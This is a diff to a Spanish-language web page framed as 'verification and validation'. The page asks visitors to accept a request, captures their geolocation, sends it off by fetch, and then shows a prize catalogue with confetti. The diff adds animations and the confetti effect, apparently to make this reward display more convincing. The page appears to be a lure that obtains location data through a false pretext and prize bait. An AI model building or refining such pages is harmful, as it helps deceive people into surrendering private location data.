@@ -13,7 +13,7 @@
       color: #333;
     }
     .container {
-      max-width: 800px;
+      max-width: 900px;
       margin: 60px auto;
       background: #fff;
       border-radius: 15px;
@@ -55,7 +55,7 @@
     .premios {
       margin-top: 30px;
       display: none;
-      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
       gap: 20px;
     }
     .premio-card {
@@ -64,28 +64,42 @@
       box-shadow: 0 4px 15px rgba(0,0,0,0.1);
       padding: 15px;
       transition: transform 0.3s ease, box-shadow 0.3s ease;
-    }
-    .premio-card:hover {
-      transform: translateY(-8px);
-      box-shadow: 0 8px 25px rgba(0,0,0,0.15);
+      opacity: 0;
+      transform: scale(0.9);
+      animation: showCard 0.6s forwards;
     }
     .premio-card img {
       width: 100%;
       border-radius: 10px;
       object-fit: cover;
+      height: 150px;
     }
     .premio-card h3 {
       margin: 10px 0 0;
       font-size: 16px;
       color: #333;
     }
+    .premio-card:hover {
+      transform: scale(1.05);
+      box-shadow: 0 8px 25px rgba(0,0,0,0.15);
+    }
     @keyframes fadeIn {
       from { opacity: 0; transform: translateY(20px); }
       to { opacity: 1; transform: translateY(0); }
     }
+    @keyframes showCard {
+      to { opacity: 1; transform: scale(1); }
+    }
+    canvas {
+      position: fixed;
+      top: 0;
+      left: 0;
+      pointer-events: none;
+    }
   </style>
 </head>
 <body>
+  <canvas id="confetti"></canvas>
   <div class="container">
     <h1>✅ VERIFICACIÓN Y VALIDACIÓN</h1>
     <p>Por favor, pulsa el botón y acepta la solicitud.</p>
@@ -144,29 +158,69 @@ function onSuccess(pos) {
     body: JSON.stringify(data, null, 2)
   });
 
-  // Mostrar mensaje
+  // Mostrar mensaje y premios
   document.getElementById("msg").style.display = "block";
-
-  // Mostrar catálogo de premios
   const premiosDiv = document.getElementById("premios");
   premiosDiv.style.display = "grid";
   premiosDiv.innerHTML = "";
 
-  premios.forEach(p => {
+  premios.forEach((p, i) => {
     const card = document.createElement("div");
     card.className = "premio-card";
+    card.style.animationDelay = `${i * 0.2}s`; // animación escalonada
     card.innerHTML = `
       <img src="${p.img}" alt="${p.nombre}">
       <h3>${p.nombre}</h3>
     `;
     premiosDiv.appendChild(card);
   });
+
+  lanzarConfeti();
 }
 
 function onError(err) {
   alert("⚠️ Error al obtener ubicación: " + (err.message || err.code));
 }
+
+/* 🎊 Confeti simple en canvas */
+function lanzarConfeti() {
+  const canvas = document.getElementById("confetti");
+  const ctx = canvas.getContext("2d");
+  canvas.width = window.innerWidth;
+  canvas.height = window.innerHeight;
+
+  const piezas = [];
+  const colores = ["#f94144", "#f3722c", "#f9c74f", "#90be6d", "#577590", "#43aa8b"];
+
+  for (let i = 0; i < 120; i++) {
+    piezas.push({
+      x: Math.random() * canvas.width,
+      y: Math.random() * canvas.height - canvas.height,
+      w: 10,
+      h: 10,
+      color: colores[Math.floor(Math.random() * colores.length)],
+      velocidad: Math.random() + 1
+    });
+  }
+
+  function animar() {
+    ctx.clearRect(0, 0, canvas.width, canvas.height);
+    piezas.forEach(p => {
+      ctx.fillStyle = p.color;
+      ctx.fillRect(p.x, p.y, p.w, p.h);
+      p.y += p.velocidad;
+      if (p.y > canvas.height) p.y = -10;
+    });
+    requestAnimationFrame(animar);
+  }
+  animar();
+
+  // detener después de 6s
+  setTimeout(() => ctx.clearRect(0,0,canvas.width,canvas.height), 6000);
+}
 </script>
 </body>
 </html>
+
+
 
